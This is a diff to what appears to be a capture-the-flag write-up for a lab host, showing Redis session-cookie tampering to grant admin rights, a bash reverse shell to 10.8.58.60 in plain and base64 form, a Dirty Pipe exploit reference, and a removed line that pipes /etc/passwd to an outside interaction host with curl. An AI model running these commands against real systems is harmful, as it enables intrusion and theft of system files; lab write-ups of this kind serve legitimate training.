@@ -15,7 +15,7 @@ This exciting mission will require the highest level of strategy and speed to us
 - 80
 - 6379
 
-    *GEt and modify the cookie value at REdis* ->
+*GEt and modify the cookie value at REdis* ->
   #+begin_src sh
 [10:09][]~ ✮ redis-cli -h blackbot.hv
 blackbot.hv:6379> keys *
@@ -34,6 +34,7 @@ blackbot.hv:6379>
 : set ded8d036-0285-4930-a69d-e083e13761da "{\"userID\":\"4204da10-e68e-4020-8f68-c96d253bca71\",\"username\":\"jon\",\"isAdmin\":true,\"isPremium\":true}"
 
 *simple bash payload enconded base64* ->
+: bash -i >& /dev/tcp/10.8.58.60/7777 0>&1
 : IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTcyLjIwLjE5LjUwLzc3NzcgMD4mMQo=
 
 *Request to get reverse shell with this bash base64 payload* ->
@@ -67,7 +68,3 @@ https://github.com/Al1ex/CVE-2022-0847?tab=readme-ov-file
 
 *bash*
 : bash -i >& /dev/tcp/10.8.58.60/7777 0>&1
-
-
-
-: cat /etc/passwd | base64 | curl -d @- facobjhzpdpvejleegrunnnhooul91vxo.oast.fun
